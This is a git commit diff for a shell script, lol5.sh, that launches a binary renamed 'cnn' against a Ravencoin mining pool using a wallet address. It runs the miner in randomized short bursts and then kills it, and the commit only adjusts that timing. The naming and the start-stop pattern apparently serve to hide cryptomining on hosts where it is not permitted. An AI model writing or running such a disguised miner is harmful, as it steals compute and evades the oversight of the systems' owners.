627f627bd4e2732439c85f55b61c9a46cc82a2df
kartikbhalala <47134161+kartikbhalala@users.noreply.github.com>
2020-12-03 09:54:49 +0530

    Update lol5.sh

--- lol5.sh
+++ lol5.sh
@@ -5,12 +5,12 @@ do
 	y=20
 	z=$(($x+$y))
 
-	a=$(($RANDOM%120))
-	b=650
+	a=$(($RANDOM%15))
+	b=10
 	c=$(($a+$b))
 
 	w=$(($RANDOM%60))
-	e=10
+	e=120
 	aaram=$(($w+$e))
 	timeout -k 5 $c\s   ./cnn/cnn -P stratum+ssl://RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.worker:pps@asia.ravenminer.com:13802 -U
 	timeout -k 5 2s pgrep cnn | xargs kill
